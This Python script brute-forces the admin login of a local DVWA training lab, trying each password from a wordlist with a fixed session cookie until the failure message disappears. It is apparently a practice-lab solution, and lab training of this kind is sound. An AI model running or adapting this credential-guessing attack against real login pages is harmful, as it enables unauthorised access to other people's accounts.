import sys
import requests

def ParseFile( filename ):
    fd = open( filename, 'r' )
    buf = fd.read().split( '\n' )
    fd.close()
    return buf

if __name__ == "__main__":

    passwords = ParseFile( 'password.txt' )

    url = 'http://dvwa.local/vulnerabilities/brute/index.php'
    cookie = {'PHPSESSID': 'q8mjafomkf8tdhfb35drl7k714', 'security': 'low'}
    s = requests.Session()
    response = s.get(url, cookies=cookie)
    #print(response.text)

    #valid_username = 'admin'
    success = False

    for password in passwords:

        payload = {'username': 'admin', 'password': password, 'Login': 'Login'}
        r = s.get(url, cookies=cookie, params=payload)
        if(r.text.find('Username and/or password incorrect') == -1):
            print "[+] Valid password is <%s>" % password
            success = True
            break
    if not success:
        print('Password not found.')